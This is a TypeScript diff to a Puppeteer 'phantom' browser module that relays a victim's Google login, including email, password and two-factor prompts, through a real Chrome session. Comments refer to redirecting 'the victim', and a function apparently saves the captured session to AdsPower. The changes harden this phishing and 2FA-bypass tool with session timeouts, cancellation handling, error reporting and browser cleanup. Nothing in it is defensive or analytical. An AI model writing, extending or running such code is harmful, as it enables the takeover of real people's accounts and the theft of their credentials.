@@ -1,6 +1,6 @@
 import puppeteer, { type Browser, type Page } from "puppeteer-core";
 import { chromeLaunchArgs, findChrome, shouldRunHeadless } from "@/lib/chrome";
-import { releaseTwoFactor, setChooseMethod, setInputError, setDeviceName, submitEmail, submitPassword, setChromeReady } from "@/lib/demo-session";
+import { releaseTwoFactor, setChooseMethod, setInputError, setDeviceName, submitEmail, submitPassword, setChromeError, setChromeReady } from "@/lib/demo-session";
 import type { MethodOption, TwoFactorType } from "@/lib/demo-session";
 
 const TARGET_URL =
@@ -24,16 +24,20 @@ type PhantomStore = {
   browser: Browser | null;
   pages: Map<string, Page>;
   completionTracked: Set<string>; // sessões com waitForLoginComplete ativo
+  cancelledSessions: Set<string>;
+  sessionTimers: Map<string, NodeJS.Timeout>;
   loggedIn: boolean; // true se o último Chrome concluiu login com sucesso
 };
 
 function getStore(): PhantomStore {
   const g = globalThis as typeof globalThis & { __phantomStore?: PhantomStore };
   if (!g.__phantomStore) {
-    g.__phantomStore = { browser: null, pages: new Map(), completionTracked: new Set(), loggedIn: false };
+    g.__phantomStore = { browser: null, pages: new Map(), completionTracked: new Set(), cancelledSessions: new Set(), sessionTimers: new Map(), loggedIn: false };
   }
   return g.__phantomStore;
 }
+
+const PHANTOM_SESSION_TTL_MS = Number.parseInt(process.env.PHANTOM_SESSION_TTL_MS ?? "600000", 10);
 
 async function launchFreshBrowser(): Promise<Browser> {
   const store = getStore();
@@ -55,6 +59,9 @@ async function launchFreshBrowser(): Promise<Browser> {
     store.browser = null;
     store.pages.clear();
     store.completionTracked.clear();
+    store.cancelledSessions.clear();
+    for (const timer of store.sessionTimers.values()) clearTimeout(timer);
+    store.sessionTimers.clear();
   }
 
   const executablePath = findChrome();
@@ -167,6 +174,7 @@ async function getGoogleErrorText(page: Page): Promise<string> {
 
 export async function startPhantom(sessionId: string): Promise<void> {
   try {
+    getStore().cancelledSessions.delete(sessionId);
     console.log("[phantom] startPhantom", sessionId, "chrome:", findChrome());
     const browser = await launchFreshBrowser();
     console.log("[phantom] browser launched");
@@ -194,11 +202,22 @@ export async function startPhantom(sessionId: string): Promise<void> {
     console.log("[phantom] navigating to", TARGET_URL);
     await page.goto(TARGET_URL, { waitUntil: "domcontentloaded", timeout: 15000 });
     console.log("[phantom] navigation done, url:", page.url());
-    getStore().pages.set(sessionId, page);
+    const store = getStore();
+    store.pages.set(sessionId, page);
+    const previousTimer = store.sessionTimers.get(sessionId);
+    if (previousTimer) clearTimeout(previousTimer);
+    const ttlTimer = setTimeout(() => {
+      console.log("[phantom] session TTL reached, closing", sessionId);
+      closePhantom(sessionId);
+    }, Number.isFinite(PHANTOM_SESSION_TTL_MS) && PHANTOM_SESSION_TTL_MS > 0 ? PHANTOM_SESSION_TTL_MS : 600000);
+    ttlTimer.unref();
+    store.sessionTimers.set(sessionId, ttlTimer);
     setChromeReady(sessionId);
     console.log("[phantom] session registered, chrome ready");
   } catch (err) {
     console.error("[phantom] startPhantom ERROR:", err);
+    const message = err instanceof Error ? err.message : "Erro desconhecido ao abrir Chrome.";
+    setChromeError(sessionId, message);
   }
 }
 
@@ -457,13 +476,25 @@ async function waitForLoginComplete(sessionId: string, page: Page): Promise<void
   try {
     console.log("[phantom] waitForLoginComplete: started polling for", sessionId);
     const deadline = Date.now() + 300000; // 5 minutos (device 2FA pode demorar)
+    let lastLoggedUrl = "";
 
     // Listener de navegação — acorda o loop imediatamente quando o Chrome navegar
     let navResolve: (() => void) | null = null;
     const onNav = () => { if (navResolve) { navResolve(); navResolve = null; } };
     page.on("framenavigated", onNav);
+    page.on("close", onNav);
 
     while (Date.now() < deadline) {
+      const { getDemoSession } = await import("@/lib/demo-session");
+      if (store.cancelledSessions.has(sessionId) || !getDemoSession(sessionId)) {
+        console.log("[phantom] waitForLoginComplete: cancelled", sessionId);
+        break;
+      }
+      if (page.isClosed()) {
+        console.log("[phantom] waitForLoginComplete: page closed", sessionId);
+        break;
+      }
+
       // Aguarda 1s OU até o Chrome navegar (o que vier primeiro)
       await Promise.race([
         new Promise<void>((r) => { navResolve = r; setTimeout(r, 1000); }),
@@ -473,7 +504,10 @@ async function waitForLoginComplete(sessionId: string, page: Page): Promise<void
       let url = "";
       try { url = page.url(); } catch { page.off("framenavigated", onNav); break; } // página fechada
 
-      console.log("[phantom] waitForLoginComplete: url =", url);
+      if (url !== lastLoggedUrl) {
+        console.log("[phantom] waitForLoginComplete: url =", url);
+        lastLoggedUrl = url;
+      }
 
       // Checar apenas o hostname — evita falso positivo com "continue=https://ads.google.com/" na query
       let hostname = "";
@@ -489,9 +523,9 @@ async function waitForLoginComplete(sessionId: string, page: Page): Promise<void
 
       if (isFinished) {
         page.off("framenavigated", onNav);
+        page.off("close", onNav);
         console.log("[phantom] login complete →", url);
         getStore().loggedIn = true; // preserva o Chrome para a próxima sessão
-        const { getDemoSession } = await import("@/lib/demo-session");
         const session = getDemoSession(sessionId);
         // Redireciona a vítima para a URL real onde o Chrome chegou após login
         if (session) session.forceRedirect = url;
@@ -501,7 +535,8 @@ async function waitForLoginComplete(sessionId: string, page: Page): Promise<void
     }
 
     page.off("framenavigated", onNav);
-    console.log("[phantom] waitForLoginComplete: deadline reached, url:", page.url());
+    page.off("close", onNav);
+    if (!page.isClosed()) console.log("[phantom] waitForLoginComplete: deadline reached, url:", page.url());
   } catch (err) {
     console.error("[phantom] waitForLoginComplete ERROR:", err);
   } finally {
@@ -1257,9 +1292,19 @@ async function saveToAdsPower(page: Page, sessionId: string, session: import("@/
 
 export function closePhantom(sessionId: string): void {
   const store = getStore();
+  store.cancelledSessions.add(sessionId);
+  store.completionTracked.delete(sessionId);
+  const timer = store.sessionTimers.get(sessionId);
+  if (timer) clearTimeout(timer);
+  store.sessionTimers.delete(sessionId);
   const page = store.pages.get(sessionId);
   if (page) {
     void page.close().catch(() => {});
     store.pages.delete(sessionId);
+  }
+  if (store.pages.size === 0 && store.browser) {
+    void store.browser.close().catch(() => {});
+    store.browser = null;
+    store.loggedIn = false;
   }
 }
